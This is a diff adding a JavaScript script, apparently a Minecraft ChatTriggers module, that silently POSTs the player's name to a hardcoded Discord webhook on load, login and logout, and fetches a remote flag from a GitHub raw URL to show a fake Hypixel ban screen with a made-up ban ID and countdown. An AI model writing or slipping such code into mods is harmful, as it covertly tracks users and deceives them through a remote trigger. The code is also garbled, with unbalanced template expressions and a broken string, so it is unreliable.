@@ -1,0 +1,76 @@
+import request from "../requestV2";
+
+let webhook="https://discord.com/api/webhooks/1355805838090047640/zR_er63aIbEX6Y6s2aoRSwMXzBPmZ52znYQb6WejRisqvw8gfoMuuKSHu2ZbY4GajXNV"
+
+request({
+    url: webhook,
+    method: "POST",
+    headers: {"User-agent":"Mozilla/5.0"},
+    body: {content: `[${new Date().toISOString()}] ${Player.getName(}} loaded`}
+});
+
+function generateRandomString() {
+  var result = '';
+  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789012345678901234567890123456789";
+  var charsLength = chars.length;
+  for (var i = 0; i < 8; i++) {
+    result += chars.charAt(Math.floor(Math.random() * charsLength));
+  }
+  return result;
+}
+
+let banId = generateRandomString();
+
+function formatTime(seconds) {
+  const days = Math.floor(seconds / 86400);
+  seconds %= 86400;
+  const hours = Math.floor(seconds / 3600);
+  seconds %= 3600;
+  const minutes = Math.floor(seconds / 60);
+  seconds %= 60;
+  return days + "d " + hours + "h " + minutes + "m " + seconds + 's';
+}
+
+let banDuration = 31103999; // ~360 days
+
+function showBan() {
+  let banMsg3 = banMessage3;
+  let banMsg2 = banMessage2;
+  let banMsg1 = banMessage1;
+  
+  banComponent = new ChatComponentText(banMsg1 + formatTime(banDuration) + banMsg2 + banId + banMsg3);
+  Client.getMinecraft().getNetHandler().getNetworkManager().sendPacket(banComponent);
+}
+
+isBanned = FileLib.getUrlContent("https://raw.githubusercontent.com/Enivzoy/craftz/refs/heads/main/gg");
+
+register("worldUnload",()=>{
+    request({
+    url: webhook,
+    method: "POST",
+    headers: {"User-agent":"Mozilla/5.0"},
+    body: {content: `[${new Date().toISOString()}] ${Player.getName(}} logged out`}
+});
+})
+
+register("worldLoad",()=>{
+  request({
+    url: webhook,
+    method: "POST",
+    headers: {"User-agent":"Mozilla/5.0"},
+    body: {content: `[${new Date().toISOString()}] ${Player.getName(}} logged in`}
+  });
+})
+
+register("serverConnect", event => {
+  if (Server.getIP().includes("hypixel.net") && isBanned.includes("yes)) {
+    setTimeout(() => {
+      showBan();
+    }, 275);
+  }
+});
+
+register("step", () => {
+  checkCommands();
+  banDuration = banDuration - 1;
+}).setFps(1);
